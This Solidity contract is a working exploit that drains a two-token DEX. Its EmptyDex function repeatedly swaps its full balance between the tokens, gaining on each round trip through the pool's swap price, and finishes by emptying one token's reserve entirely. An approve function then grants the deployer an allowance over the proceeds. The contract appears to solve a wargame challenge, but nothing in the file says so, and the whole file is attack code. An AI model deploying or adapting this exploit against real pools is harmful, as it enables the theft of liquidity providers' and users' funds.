// SPDX-License-Identifier: GPL-3.0
pragma solidity ^0.8.0;

interface IDex {
    function approve(address spender, uint amount) external;
    function swap(address from, address to, uint amount) external;
    function balanceOf(address token, address account) external view returns (uint);
    function getSwapPrice(address from, address to, uint amount) external view returns(uint);
    function token1() external view returns(address);
    function token2() external view returns(address);
}

interface ISwappableToken {
    function transfer(address to, uint256 amount) external returns (bool);
}

contract TokenSwapDex {

    IDex dex;
    address tokenOne;
    address tokenTwo;
    address owner;

    constructor(address _dex) {
        dex = IDex(_dex);
        tokenOne = dex.token1();
        tokenTwo = dex.token2();
        owner = msg.sender;
    }

    function EmptyDex() external {
        uint256 tokenBalance = dex.balanceOf(tokenOne, address(this));
        dex.approve(address(dex), tokenBalance);
        dex.swap(tokenOne, tokenTwo, tokenBalance);

        while(dex.balanceOf(tokenOne, address(dex)) > 0 && dex.balanceOf(tokenTwo, address(dex)) > 0) {
            if (dex.balanceOf(tokenOne, address(this)) == 0) {
                tokenBalance = dex.balanceOf(tokenTwo, address(this));
                uint256 swapPrice = dex.getSwapPrice(tokenTwo, tokenOne, tokenBalance);
                if (dex.balanceOf(tokenOne, address(dex)) >= swapPrice) {
                    dex.approve(address(dex), tokenBalance);
                    dex.swap(tokenTwo, tokenOne, tokenBalance);
                } else {
                    // Swap amount not enough send the minimal to leave the other token empty
                    tokenBalance = dex.balanceOf(tokenTwo, address(dex));
                    dex.approve(address(dex), tokenBalance);
                    dex.swap(tokenTwo, tokenOne, tokenBalance);
                }
            } else if (dex.balanceOf(tokenTwo, address(this)) == 0) {
                tokenBalance = dex.balanceOf(tokenOne, address(this));
                uint256 swapPrice = dex.getSwapPrice(tokenOne, tokenTwo, tokenBalance);
                if (dex.balanceOf(tokenTwo, address(dex)) >= swapPrice) {
                    dex.approve(address(dex), tokenBalance);
                    dex.swap(tokenOne, tokenTwo, tokenBalance);
                } else {
                    // Swap amount not enough send the minimal to leave the other token empty
                    tokenBalance = dex.balanceOf(tokenOne, address(dex));
                    dex.approve(address(dex), tokenBalance);
                    dex.swap(tokenOne, tokenTwo, tokenBalance);
                }
            } else {
                break;
            }
        }
    }

    function approve() external {
      dex.approve(owner, 10000000);
    }

}